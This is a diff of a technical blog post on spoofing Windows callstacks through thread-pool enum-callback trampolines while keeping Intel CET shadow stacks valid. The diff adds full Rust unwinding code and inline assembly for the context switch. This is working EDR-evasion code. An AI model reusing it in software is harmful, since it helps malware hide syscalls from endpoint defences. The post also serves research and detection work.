@@ -1,10 +1,10 @@
 ---
 layout: post
 title: "CET-Compliant Callstack Spoofing via Thread Pool Enum Callback Trampolining"
+description: "A CET-compliant callstack spoofing technique that uses Windows thread-pool enum callbacks as syscall trampolines, defeating EDR stack telemetry without breaking Intel shadow-stack invariants."
 date: 2026-07-12
 permalink: /cet-callstack-spoofing-thread-pool-trampoline
 lang: en
-author: Tiziano Marra
 tags: [malware-dev, red-teaming, evasion, edr-evasion, cet, intel-cet, shadow-stack, hardware-mitigations, callstack-spoofing, stack-spoofing, indirect-syscalls, direct-syscalls, thread-pool, thread-pool-api, enum-callback, trampolining, windows-internals, winapi, x64-assembly, rtlvirtualunwind, rust, rustsec, infosec, offensive-security]
 ---
 
@@ -31,39 +31,37 @@ tags: [malware-dev, red-teaming, evasion, edr-evasion, cet, intel-cet, shadow-st
   - [3.3 What Is an Indirect Syscall?](#33-what-is-an-indirect-syscall)
   - [3.4 The Windows Thread Pool](#34-the-windows-thread-pool)
   - [3.5 Enum Callback Functions](#35-enum-callback-functions)
-  - [3.6 Manual Stack Unwinding with RtlVirtualUnwind](#36-manual-stack-unwinding-with-rtlvirtualunwind)
+  - [3.6 Manual Stack Unwinding with `RtlVirtualUnwind`](#36-manual-stack-unwinding-with-rtlvirtualunwind)
   - [3.7 Intel CET and the Shadow Stack](#37-intel-cet-and-the-shadow-stack)
-  - [3.8 The TEB ArbitraryUserPointer](#38-the-teb-arbitraryuserpointer)
+  - [3.8 The TEB `ArbitraryUserPointer`](#38-the-teb-arbitraryuserpointer)
 - [4. Technique Design](#4-technique-design)
   - [4.1 High-Level Overview](#41-high-level-overview)
   - [4.2 The Three Phases](#42-the-three-phases)
   - [4.3 The Resulting Callstack](#43-the-resulting-callstack)
 - [5. Implementation Deep Dive](#5-implementation-deep-dive)
-  - [5.1 The EmbeddedContext Structure](#51-the-embeddedcontext-structure)
+  - [5.1 The `EmbeddedContext` Structure](#51-the-embeddedcontext-structure)
   - [5.2 The Thread Pool Dispatcher](#52-the-thread-pool-dispatcher)
   - [5.3 Phase 1: The Thread Pool Worker](#53-phase-1-the-thread-pool-worker)
   - [5.4 Phase 2: The Enum Callback (Syscall Execution)](#54-phase-2-the-enum-callback-syscall-execution)
   - [5.5 Phase 3: Cleanup](#55-phase-3-cleanup)
-  - [5.6 user\_mode\_continue: CET-Compliant Context Switch](#56-user_mode_continue-cet-compliant-context-switch)
-  - [5.7 A Note on RAX: You Can't Get It Back](#57-a-note-on-rax-you-cant-get-it-back)
+  - [5.6 `user_mode_continue`: CET-Compliant Context Switch](#56-user_mode_continue-cet-compliant-context-switch)
+  - [5.7 A Note on `RAX`: You Can't Get It Back](#57-a-note-on-rax-you-cant-get-it-back)
 - [6. CET Compliance: The Core Contribution](#6-cet-compliance-the-core-contribution)
   - [6.1 Why Traditional Spoofing Breaks Under CET](#61-why-traditional-spoofing-breaks-under-cet)
-  - [6.2 JMP Instead of RET](#62-jmp-instead-of-ret)
+  - [6.2 `JMP` Instead of RET](#62-jmp-instead-of-ret)
   - [6.3 Shadow Stack Pointer Reconciliation](#63-shadow-stack-pointer-reconciliation)
-    - [Phase 1](#phase-1)
-    - [Phase 2](#phase-2)
   - [6.4 Build Configuration for CET](#64-build-configuration-for-cet)
 - [7. The 39 Enum Functions](#7-the-39-enum-functions)
   - [7.1 The Complete List](#71-the-complete-list)
   - [7.2 Why These Functions Work](#72-why-these-functions-work)
   - [7.3 Not All Functions Support All Syscall Argument Counts](#73-not-all-functions-support-all-syscall-argument-counts)
-  - [7.4 A Note on InitOnceExecuteOnce](#74-a-note-on-initonceexecuteonce)
-  - [7.5 Why Not user32.dll?](#75-why-not-user32dll)
+  - [7.4 A Note on `InitOnceExecuteOnce`](#74-a-note-on-initonceexecuteonce)
+  - [7.5 Why Not `user32.dll`?](#75-why-not-user32dll)
 - [8. The Debugging Nightmare](#8-the-debugging-nightmare)
   - [8.1 The Enum Function Crashes](#81-the-enum-function-crashes)
   - [8.2 The Thread Pool Crashes](#82-the-thread-pool-crashes)
   - [8.3 The 8-Byte Offset That Ruined My Week](#83-the-8-byte-offset-that-ruined-my-week)
-  - [8.4 INCSSPD vs INCSSPQ: The 4-Byte Misalignment](#84-incsspd-vs-incsspq-the-4-byte-misalignment)
+  - [8.4 `INCSSPD` vs `INCSSPQ`: The 4-Byte Misalignment](#84-incsspd-vs-incsspq-the-4-byte-misalignment)
 - [9. About This PoC](#9-about-this-poc)
   - [9.1 What Is Intentionally Simplified](#91-what-is-intentionally-simplified)
   - [9.2 This Is NOT a Weapon](#92-this-is-not-a-weapon)
@@ -74,7 +72,7 @@ tags: [malware-dev, red-teaming, evasion, edr-evasion, cet, intel-cet, shadow-st
   - [11.3 Heuristic Call Stack Analysis](#113-heuristic-call-stack-analysis)
   - [11.4 Enum Callback Behavioral Analysis](#114-enum-callback-behavioral-analysis)
   - [11.5 Thread Pool Work Item Profiling](#115-thread-pool-work-item-profiling)
-  - [11.6 INCSSPQ Instruction Monitoring](#116-incsspq-instruction-monitoring)
+  - [11.6 `INCSSPQ` Instruction Monitoring](#116-incsspq-instruction-monitoring)
 - [12. Conclusion](#12-conclusion)
 - [13. Prior Art and Acknowledgments](#13-prior-art-and-acknowledgments)
 - [14. References](#14-references)
@@ -108,7 +106,7 @@ Before diving in, let me give some context on how we got here. The cat-and-mouse
 For years, EDRs relied on user-mode API hooking. The EDR injects a DLL into every process, places trampolines at the beginning of sensitive `ntdll.dll` functions (`NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtWriteVirtualMemory`, etc.), and intercepts every call to inspect arguments before letting it through.
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/user-mode-hooking.png" alt="User-mode hooking">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/user-mode-hooking.png" alt="User-mode hooking">
     <br>
     <em>Image credit: <a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls" target="_blank">RedOps</a></em>
 </p>
@@ -118,7 +116,7 @@ The offensive response was **direct syscalls**: skip `ntdll.dll` entirely. Load 
 [SysWhispers](https://github.com/jthuraisamy/SysWhispers) by @jthuraisamy made this accessible by generating header/ASM stubs. [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) improved `SSN` resolution. Around the same time, [Hell's Gate](https://github.com/am0nsec/HellsGate) by am0nsec and smelly\_\_vx introduced dynamic `SSN` resolution by parsing `ntdll.dll` in memory. [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) and [Tartarus' Gate](https://github.com/trickster0/TartarusGate) by trickster0 handled cases where some stubs were hooked.
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/direct_syscalls_principle.png" alt="Direct syscalls principle diagram">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/direct_syscalls_principle.png" alt="Direct syscalls principle diagram">
     <br>
     <em>Image credit: <a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls" target="_blank">RedOps</a></em>
 </p>
@@ -144,7 +142,7 @@ The answer was **indirect syscalls**: instead of executing `syscall` from your c
 The immediate return address now points into `ntdll.dll`. Clean. But the rest of the stack still reveals the real caller. EDRs started walking deeper.
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/indirect_syscalls_principle.png" alt="Indirect syscalls principle diagram">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/indirect_syscalls_principle.png" alt="Indirect syscalls principle diagram">
     <br>
     <em>Image credit: <a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls" target="_blank">RedOps</a></em>
 </p>
@@ -162,7 +160,7 @@ Next step: forge the entire stack. Make every frame look legitimate. Several res
 All solid work. But they all share a problem: they manipulate return addresses on the normal stack. And then Intel dropped the bomb.
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/call_stack_spoofing_theory.png" alt="Call stack spoofing">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/call_stack_spoofing_theory.png" alt="Call stack spoofing">
     <br>
     <em>Image credit: <a href="https://dtsec.us/2023-09-15-StackSpoofin/" target="_blank">dtsec.us</a></em>
 </p>
@@ -256,7 +254,7 @@ fn get_trampoline(func_addr: *mut u8) -> Result<u64, ()> {
 When I want to run the `syscall`, I load the `SSN` into `RAX`, arguments into the right registers, and jump to the trampoline. The kernel sees the return address pointing into `ntdll.dll`. Clean.
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/ZwProtectVirtualMemory_trampoline_ssn.png" alt="x64dbg ZwProtectVirtualMemory disassembly">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/ZwProtectVirtualMemory_trampoline_ssn.png" alt="x64dbg ZwProtectVirtualMemory disassembly">
     <br>
     <em>x64dbg ZwProtectVirtualMemory disassembly</em>
 </p>
@@ -287,7 +285,7 @@ The key property: when the OS calls your callback, the enum function itself appe
 
 More on the specific 39 functions I identified in [Section 7](#7-the-39-enum-functions).
 
-### 3.6 Manual Stack Unwinding with RtlVirtualUnwind
+### 3.6 Manual Stack Unwinding with `RtlVirtualUnwind`
 
 `RtlVirtualUnwind` is the core Windows API for programmatic stack unwinding. The OS uses it for exception handling, debuggers use it for stack walks. Given a RIP and the function's `RUNTIME_FUNCTION` entry, it computes the caller's register state: return address, stack pointer, saved registers, everything.
 
@@ -336,7 +334,7 @@ There are however two user-mode instructions we can use:
 
 | Instruction | Opcode bytes | What it does |
 |---|---|---|
-| `RDSSPQ reg` | `F3 48 0F 1E C8` | Read Shadow Stack Pointer into `reg`. Returns 0 if CET is off. |
+| `RDSSPQ reg` | `F3 48 0F 1E C8` | Read Shadow Stack Pointer into `reg`. Returns `0` if CET is off. |
 | `INCSSPQ reg` | `F3 48 0F AE E9` | Advance SSP forward by `reg × 8` bytes (one entry per unit on x64). |
 
 **Important:** there is also a 32-bit variant, `INCSSPD`, which advances by `reg × 4` bytes. On x64, shadow stack entries are 8 bytes each. Using `INCSSPD` with a value of 1 advances by only 4 bytes, half an entry, and leaves the SSP misaligned. On x64, always use `INCSSPQ`. I learned this the hard way (see [Section 8.4](#84-incsspd-vs-incsspq-the-4-byte-misalignment)).
@@ -344,12 +342,12 @@ There are however two user-mode instructions we can use:
 These are the foundation of my CET compliance strategy.
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/fully_working_SSP_vs_CS.png" alt="Example of fully working Shadow Stack compared to normal call stack">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/fully_working_SSP_vs_CS.png" alt="Example of fully working Shadow Stack compared to normal call stack">
     <br>
     <em>Example of fully working Shadow Stack compared to normal call stack</em>
 </p>
 
-### 3.8 The TEB ArbitraryUserPointer
+### 3.8 The TEB `ArbitraryUserPointer`
 
 The Thread Environment Block (`TEB`) at offset `0x28` has a field called `ArbitraryUserPointer`. It's a per-thread pointer with no defined OS semantics. Applications can use it for whatever.
 
@@ -371,7 +369,7 @@ Three phases, same thread:
 
 1. **Thread pool worker**: creates a clean stack base, unwinds one frame, redirects to an enum function (e.g. `EnumSystemLocalesEx`).
 2. **Enum callback (first invocation)**: unwinds again, sets up the `syscall` registers, redirects to a `syscall; ret` trampoline in `ntdll.dll`.
-3. **Enum callback (second invocation, if needed)**: cleans up stack slots, returns 0 to stop the enumeration. Only happens if the `syscall` returned non-zero (more on this in [7.2](#72-why-these-functions-work)).
+3. **Enum callback (second invocation, if needed)**: cleans up stack slots, returns `0` to stop the enumeration. Only happens if the `syscall` returned non-zero (more on this in [7.2](#72-why-these-functions-work)).
 
 Each "redirect" goes through `user_mode_continue`, a custom inline assembly routine that reconciles the CET shadow stack and restores the full CPU state before jumping to the target.
 
@@ -397,7 +395,7 @@ Let me walk you through the stack visually.
 
 We unwind our frame and redirect execution to `EnumSystemLocalesEx`. After the redirect:
 
-**Inside EnumSystemLocalesEx, before it calls our callback:**
+**Inside `EnumSystemLocalesEx`, before it calls our callback:**
 
 ```
   ┌─────────────────────────────────────────────────────────┐
@@ -438,7 +436,7 @@ We unwind our frame and redirect execution to `EnumSystemLocalesEx`. After the r
 Every single frame: `ntdll.dll`, `kernelbase.dll`, or `kernel32.dll`. No unbacked memory.
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/ZwProtectVirtualMemory_callstack_ssp.png" alt="WinDbg callstack at the moment of syscall">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/ZwProtectVirtualMemory_callstack_ssp.png" alt="WinDbg callstack at the moment of syscall">
     <br>
     <em>WinDbg callstack at the moment of syscall</em>
 </p>
@@ -460,12 +458,12 @@ ntdll!RtlUserThreadStart+2C
 `EnumSystemLocalesEx` (resolved from `kernelbase.dll`) internally calls `Internal_EnumSystemLocales`, which in turn calls our callback. Both frames are on the stack, both from `kernelbase.dll`.
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/console_output.png" alt="Console output showing successful execution">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/console_output.png" alt="Console output showing successful execution">
     <br>
     <em>Console output showing successful execution</em>
 </p>
 
-The full Proof of Concept repository is available on GitHub: [CET-Enum-CallStack-Spoofer](https://github.com/MrTiz/CET-Enum-CallStack-Spoofer).
+The full Proof of Concept repository is available on GitHub: [MrTiz/CET-Enum-CallStack-Spoofer](https://github.com/MrTiz/CET-Enum-CallStack-Spoofer).
 
 ---
 
@@ -473,7 +471,7 @@ The full Proof of Concept repository is available on GitHub: [CET-Enum-CallStack
 
 The PoC is Rust, targeting `x86_64-pc-windows-msvc`. Let's go through it piece by piece.
 
-### 5.1 The EmbeddedContext Structure
+### 5.1 The `EmbeddedContext` Structure
 
 This is the shared state across all three phases: `syscall` parameters, bookkeeping, stack backups.
 
@@ -538,7 +536,7 @@ fn thread_pool_dispatcher(embedded_ctx: &mut EmbeddedContext) {
 }
 ```
 
-The loop is a safety net. If the `magic` validation fails in the callback (because something else wrote to `TEB+0x28` between phases), `invoke_count` stays 0 and we retry. In practice this never happens, but I'd rather retry than silently fail.
+The loop is a safety net. If the `magic` validation fails in the callback (because something else wrote to `TEB+0x28` between phases), `invoke_count` stays `0` and we retry. In practice this never happens, but I'd rather retry than silently fail.
 
 ### 5.3 Phase 1: The Thread Pool Worker
 
@@ -552,10 +550,40 @@ extern "system" fn thread_pool_worker_enum(
     context      : *mut c_void,
     mut _work    : PTP_WORK
 ) {
+    // -- Step 1: Capture current CPU state --
     let mut aligned_context: AlignedContext = unsafe { zeroed() };
     let context_record: *mut CONTEXT = &raw mut aligned_context.0;
+
     unsafe { RtlCaptureContext(context_record) };
-    // ... RtlLookupFunctionEntry + RtlVirtualUnwind ...
+
+    // -- Step 2: Unwind one frame to get the parent's (TP internals) state --
+    let mut handler_data     : *mut c_void = null_mut();
+    let mut establisher_frame: u64 = 0;
+    let mut image_base       : u64 = 0;
+
+    let control_pc     = (unsafe { *context_record }).Rip;
+    let function_entry = unsafe { RtlLookupFunctionEntry(control_pc, &raw mut image_base, null_mut()) };
+
+    if function_entry.is_null() {
+        // Leaf function fallback: simulate a plain `ret` by popping
+        // the return address from [RSP] into RIP.
+        (unsafe { *context_record }).Rip = unsafe { *((*context_record).Rsp as *const u64) };
+        (unsafe { *context_record }).Rsp += 8;
+    }
+    else {
+        unsafe {
+            RtlVirtualUnwind(
+                UNW_FLAG_NHANDLER,
+                image_base,
+                control_pc,
+                function_entry,
+                &raw mut (*context_record),
+                &raw mut handler_data,
+                &raw mut establisher_frame,
+                null_mut(),
+            );
+        }
+    }
 ```
 
 `RtlCaptureContext` snapshots all CPU registers. `RtlVirtualUnwind` unwinds one frame, giving us the parent's (TP internals) `RIP` and `RSP`.
@@ -568,7 +596,7 @@ After the unwind, `context_record.Rip` contains the return address back into `Tp
 let real_return_address = (unsafe { *context_record }).Rip;
 let new_rsp             = (unsafe { *context_record }).Rsp - 8;
 
-unsafe { write_volatile(&raw mut (*context_record).Rsp, new_rsp) };
+unsafe { write_volatile(&raw mut (*context_record).Rsp,  new_rsp) };
 unsafe { write_volatile(new_rsp as *mut u64, real_return_address) };
 ```
 
@@ -578,23 +606,30 @@ I subtract 8 from the parent's RSP and place the real return address there. This
 
 ```rust
 // Save the stack slots that the enum function will use
+let cb = manual_stack_unwind_enum as *const () as u64;
 let sp_orig = (unsafe { *context_record }).Rsp as *mut u64;
+
 args.backup_addr_arg5 = unsafe {  sp_orig.add(4) } as u64; // RSP + 0x20
 args.backup_val_arg5  = unsafe { *sp_orig.add(4) };
-// ... same for positions 5 and 6 ...
+
+args.backup_addr_arg6 = unsafe {  sp_orig.add(5) } as u64; // RSP + 0x28
+args.backup_val_arg6  = unsafe { *sp_orig.add(5) };
+
+args.backup_addr_arg7 = unsafe {  sp_orig.add(6) } as u64; // RSP + 0x30
+args.backup_val_arg7  = unsafe { *sp_orig.add(6) };
 
 // Set up the call to EnumSystemLocalesEx(callback, 0, 0, 0)
 unsafe { write_volatile(&raw mut (*context_record).Rip, enum_cb_addr) };
-unsafe { write_volatile(&raw mut (*context_record).Rcx, cb          ) };
-unsafe { write_volatile(&raw mut (*context_record).Rdx, 0           ) };
-unsafe { write_volatile(&raw mut (*context_record).R8 , 0           ) };
-unsafe { write_volatile(&raw mut (*context_record).R9 , 0           ) };
+unsafe { write_volatile(&raw mut (*context_record).Rcx, cb          ) }; // lpLocaleEnumProcEx (our callback)
+unsafe { write_volatile(&raw mut (*context_record).Rdx, 0           ) }; // dwFlags
+unsafe { write_volatile(&raw mut (*context_record).R8 , 0           ) }; // lParam
+unsafe { write_volatile(&raw mut (*context_record).R9 , 0           ) }; // lpReserved
 
 // Write the enum function's 5th, 6th, 7th arguments onto the stack
 let sp_new = new_rsp as *mut u64;
-unsafe { write_volatile(sp_new.add(5), 0) }; // new_rsp + 0x28
-unsafe { write_volatile(sp_new.add(6), 0) }; // new_rsp + 0x30
-unsafe { write_volatile(sp_new.add(7), 0) }; // new_rsp + 0x38
+unsafe { write_volatile(sp_new.add(5), 0) }; // [new_rsp + 0x28] = 5th parameter slot
+unsafe { write_volatile(sp_new.add(6), 0) }; // [new_rsp + 0x30] = 6th parameter slot
+unsafe { write_volatile(sp_new.add(7), 0) }; // [new_rsp + 0x38] = 7th parameter slot
 ```
 
 That last block deserves explanation. Some of the 39 enum functions take more than 4 parameters (up to 7 among the ones I identified). Those extra parameters go on the stack. If we don't write proper values there, the enum function reads garbage and crashes. By zeroing those positions, we ensure that every enum function in the basket can be called safely, regardless of its arity. In this PoC, only `EnumSystemLocalesEx` (4 params) is used, but the infrastructure is there for the full 39-function basket.
@@ -603,6 +638,7 @@ That last block deserves explanation. Some of the 39 enum functions take more th
 
 ```rust
 let teb_addr = get_teb_address();
+
 args.saved_aup = unsafe { read_volatile(teb_addr.add(0x28) as *const u64) };
 unsafe { write_volatile(teb_addr.add(0x28).cast::<u64>(), context as u64) };
 
@@ -656,11 +692,11 @@ In the **success case** (`STATUS_SUCCESS` = 0), the enum function interprets the
 
 In the **failure case** (non-zero `NTSTATUS`), the enum function interprets it as `TRUE` ("keep going") and calls the callback again. Now, there's a subtlety: Phase 2 restored `TEB.ArbitraryUserPointer` to its original value *before* the context switch (we were done with the covert data channel). So when Phase 3 fires, `TEB+0x28` no longer points to our `EmbeddedContext`.
 
-What happens? The callback reads `TEB+0x28`, gets either `NULL` (common) or the original value (rare). If `NULL`, it bails immediately with `return 0`. If non-null, the `magic` validation fails and it returns 0 anyway. Either way: the enumeration stops.
+What happens? The callback reads `TEB+0x28`, gets either `NULL` (common) or the original value (rare). If `NULL`, it bails immediately with `return 0`. If non-null, the `magic` validation fails and it returns `0` anyway. Either way: the enumeration stops.
 
 The stack slots overwritten with syscall arguments 5+ in the enum function's frame are **not** restored in this path. For the PoC (with 5 arguments), the only overwritten slot is in home space territory, which is scratch space the callee can trash freely. No harm done. For syscalls with more arguments, a more robust implementation would need to keep the TEB pointer alive through the syscall, or accept that the failure path may leave the enum function's frame slightly dirty before it unwinds.
 
-### 5.6 user_mode_continue: CET-Compliant Context Switch
+### 5.6 `user_mode_continue`: CET-Compliant Context Switch
 
 This is the heart of the whole thing. A full CPU state restoration + CET reconciliation in inline assembly. It's `#[inline(never)]`, a real function with its own frame and `.pdata` entry, and this is not incidental: it's what makes the CET reconciliation necessary and active (more on this in [Section 6](#6-cet-compliance-the-core-contribution)).
 
@@ -669,29 +705,62 @@ This is the heart of the whole thing. A full CPU state restoration + CET reconci
 fn user_mode_continue(context_record: *mut CONTEXT, new_rsp: u64) -> ! {
     unsafe {
         asm!(
-            // --- CET shadow stack reconciliation ---
+            // --- CET shadow-stack reconciliation ---
             "xor rax, rax",
-            ".byte 0xF3, 0x48, 0x0F, 0x1E, 0xC8",    // RDSSPQ rax
+            ".byte 0xF3, 0x48, 0x0F, 0x1E, 0xC8",      // RDSSPQ rax - read SSP into RAX (0 if CET off)
             "test rax, rax",
-            "jz 3f",                                 // CET off → skip
-            "mov r9, 16",
+            "jz 3f",                                   // CET off -> skip the scan
+
+            "mov r9, 16",                              // max 16 entries to scan
             "2:",
-            "mov r11, [rax]",
-            "cmp r11, [r14]",
-            "je 3f",
+            "mov r11, [rax]",                          // shadow-stack entry at current SSP
+            "cmp r11, [r14]",                          // compare to expected return address at [new_rsp]
+            "je 3f",                                   // matched -> SSP is aligned, done
+
             "mov ecx, 1",
-            ".byte 0xF3, 0x48, 0x0F, 0xAE, 0xE9",    // INCSSPQ rcx
-            "add rax, 8",
+            ".byte 0xF3, 0x48, 0x0F, 0xAE, 0xE9",      // INCSSPQ rcx - advance SSP by 1*8 = one 64-bit entry
+            "add rax, 8",                              // track our mirror of SSP
             "dec r9",
             "jnz 2b",
 
-            // --- Full state restoration ---
+            // --- Full CPU state restoration ---
             "3:",
-            "mov rsp, r14",
-            // ... EFlags, all GPRs, MXCSR, XMM6-XMM15 ...
-            "mov r14, [r15 + 0xE8]",
-            "mov r15, [r15 + 0xF0]",
-            "jmp r11",                               // → CONTEXT.Rip
+            "mov rsp, r14",                            // RSP <- new_rsp
+
+            "mov ebx, dword ptr [r15 + 0x44]",         // CONTEXT.EFlags
+            "push rbx",
+            "popfq",
+
+            "mov rax, [r15 + 0x78]",                   // CONTEXT.Rax
+            "mov rcx, [r15 + 0x80]",                   // CONTEXT.Rcx
+            "mov rdx, [r15 + 0x88]",                   // CONTEXT.Rdx
+            "mov rbx, [r15 + 0x90]",                   // CONTEXT.Rbx
+            "mov rbp, [r15 + 0xA0]",                   // CONTEXT.Rbp
+            "mov rsi, [r15 + 0xA8]",                   // CONTEXT.Rsi
+            "mov rdi, [r15 + 0xB0]",                   // CONTEXT.Rdi
+            "mov r8,  [r15 + 0xB8]",                   // CONTEXT.R8
+            "mov r9,  [r15 + 0xC0]",                   // CONTEXT.R9
+            "mov r10, [r15 + 0xC8]",                   // CONTEXT.R10
+            "mov r11, [r15 + 0xF8]",                   // CONTEXT.Rip -> indirect jump target
+            "mov r12, [r15 + 0xD8]",                   // CONTEXT.R12
+            "mov r13, [r15 + 0xE0]",                   // CONTEXT.R13
+
+            "ldmxcsr dword ptr [r15 + 0x34]",          // CONTEXT.MxCsr
+            "movdqa xmm6,  [r15 + 0x200]",             // CONTEXT.Xmm6..Xmm15 (non-volatile per Win64 ABI)
+            "movdqa xmm7,  [r15 + 0x210]",
+            "movdqa xmm8,  [r15 + 0x220]",
+            "movdqa xmm9,  [r15 + 0x230]",
+            "movdqa xmm10, [r15 + 0x240]",
+            "movdqa xmm11, [r15 + 0x250]",
+            "movdqa xmm12, [r15 + 0x260]",
+            "movdqa xmm13, [r15 + 0x270]",
+            "movdqa xmm14, [r15 + 0x280]",
+            "movdqa xmm15, [r15 + 0x290]",
+
+            "mov r14, [r15 + 0xE8]",                   // CONTEXT.R14
+            "mov r15, [r15 + 0xF0]",                   // CONTEXT.R15 (must be last - r15 was our base ptr)
+
+            "jmp r11",                                 // resume at CONTEXT.Rip - NOT ret!
 
             in("r14") new_rsp,
             in("r15") context_record,
@@ -715,7 +784,7 @@ Both approaches produce correct behavior. The difference is whether CET reconcil
 
 **A note of honesty about this choice:**
 
-Let me be upfront: in this specific PoC, the `#[inline(never)]` is a deliberate forcing move. The minimal call chain (enum callback → `user_mode_continue` → `jmp`) would work fine with inlining, and the shadow stack would stay naturally aligned without any `INCSSPQ`. A reader could look at this and say: "you manufactured a problem that doesn't exist, just to demonstrate the fix."
+Let me be upfront: in this specific PoC, the `#[inline(never)]` is a deliberate forcing move. The minimal call chain (enum callback → `user_mode_continue` → `jmp`) would work fine with inlining, and the shadow stack would stay naturally aligned without any `INCSSPQ`. A reader could look at this and say: *you manufactured a problem that doesn't exist, just to demonstrate the fix.*
 
 Fair criticism. But the reconciliation loop is not designed for this PoC's trivial one-function-deep case. It exists for production scenarios where the **diverging call chain** (the sequence of nested non-returning calls from the callback down to the final `jmp`) has depth greater than 1. What creates stale shadow stack entries is not every `call` instruction, but specifically calls to functions that *never return* because they transitively reach `user_mode_continue`'s `jmp`. Each such non-returning call leaves its return address permanently on the shadow stack. Some concrete examples:
 
@@ -739,7 +808,7 @@ This is not cosmetic. The `movdqa` instruction (used for XMM register restoratio
 
 The final instruction is `jmp r11`, not `ret`. This is the key to CET compliance (explained in [Section 6](#6-cet-compliance-the-core-contribution)).
 
-### 5.7 A Note on RAX: You Can't Get It Back
+### 5.7 A Note on `RAX`: You Can't Get It Back
 
 There's an inherent limitation of this technique that's worth highlighting: you cannot recover the `syscall`'s return value (`RAX`).
 
@@ -751,7 +820,7 @@ So how do you know if the `syscall` succeeded? You use sentinel values. In the P
 let mut old_protect = 0xFFFF_FFFFu32;
 ```
 
-If `ZwProtectVirtualMemory` succeeds, the kernel writes the actual old protection value into `old_protect` (through the pointer we passed as arg5). After the thread pool work completes, we check:
+If `ZwProtectVirtualMemory` succeeds, the kernel writes the actual old protection value into `old_protect` (through the pointer we passed as `arg5`). After the thread pool work completes, we check:
 
 ```rust
 if old_protect == 0xFFFF_FFFF {
@@ -780,7 +849,7 @@ fake_addr != real_addr → #CP fault → crash
 
 The shadow stack is hardware-protected. You can't write to it with `mov`. It's over for traditional spoofing.
 
-### 6.2 JMP Instead of RET
+### 6.2 `JMP` Instead of RET
 
 My context switch uses `jmp r11` instead of `ret`.
 
@@ -807,12 +876,12 @@ The reconciliation loop advances the SSP until it lines up with what's on the no
 
 In practice, the loop fires exactly once per context switch: it skips the one stale entry left by the `call user_mode_continue`, then finds the target return address (from `RtlVirtualUnwind`) which matches `[new_rsp]`. Done.
 
-#### Phase 1
+**Phase 1**
 
 When `user_mode_continue` starts executing, the normal stack (`RSP`) has not been shifted yet. The Shadow Stack Pointer (`SSP`) naturally points to the return address left by the `call user_mode_continue` instruction (in this case, back into `thread_pool_worker_enum`). You can see this stale entry at the top of the shadow stack:
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_1_ssp_before_incsspq.png" alt="Phase 1: Shadow stack before reconciliation">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_1_ssp_before_incsspq.png" alt="Phase 1: Shadow stack before reconciliation">
     <br>
     <em>Phase 1: Shadow stack before reconciliation</em>
 </p>
@@ -820,17 +889,17 @@ When `user_mode_continue` starts executing, the normal stack (`RSP`) has not bee
 However, our forged context (`new_rsp`) expects to return directly to `TppWorkpExecuteCallback`. The reconciliation loop compares the SSP entries against our target and executes `INCSSPQ`. This advances the SSP by 8 bytes, skipping the stale entry and aligning the shadow stack with our intended return address:
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_1_ssp_after_incsspq.png" alt="Phase 1: Shadow stack after reconciliation">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_1_ssp_after_incsspq.png" alt="Phase 1: Shadow stack after reconciliation">
     <br>
     <em>Phase 1: Shadow stack after reconciliation</em>
 </p>
 
-#### Phase 2
+**Phase 2**
 
 The exact same mechanics apply during the second context switch. The `call user_mode_continue` from inside the enum callback pushes a return address (`manual_stack_unwind_enum+0x329`) onto the shadow stack. Since we are going to `jmp` to the syscall trampoline instead of returning, this entry is stale:
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_2_ssp_before_incsspq.png" alt="Phase 2: Shadow stack before reconciliation">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_2_ssp_before_incsspq.png" alt="Phase 2: Shadow stack before reconciliation">
     <br>
     <em>Phase 2: Shadow stack before reconciliation</em>
 </p>
@@ -838,7 +907,7 @@ The exact same mechanics apply during the second context switch. The `call user_
 The reconciliation loop finds the discrepancy and advances the SSP. The shadow stack now perfectly matches our forged target (`Internal_EnumSystemLocales+0x348`), ready for the syscall's `ret` instruction to pop it without raising a `#CP` fault:
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_2_ssp_after_incsspq.png" alt="Phase 2: Shadow stack after reconciliation">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_2_ssp_after_incsspq.png" alt="Phase 2: Shadow stack after reconciliation">
     <br>
     <em>Phase 2: Shadow stack after reconciliation</em>
 </p>
